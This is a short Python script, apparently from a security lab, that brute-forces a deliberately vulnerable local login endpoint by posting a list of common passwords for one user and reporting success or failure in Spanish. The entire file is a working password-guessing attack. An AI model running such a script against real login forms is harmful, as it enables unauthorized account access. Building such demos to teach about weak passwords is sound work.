import requests

url = "http://127.0.0.1:8000/login-vulnerable/"
usuario = "usuario2"
passwords = ["1234", "abc123", "password123", "admin", "test"]

for pwd in passwords:
    r = requests.post(url, data={
        "username": usuario,
        "password": pwd
    })
    if "ÉXITO" in r.text:
        print(f"✅ Encontrada: {pwd}")
        break
    else:
        print(f"❌ Fallida: {pwd}")
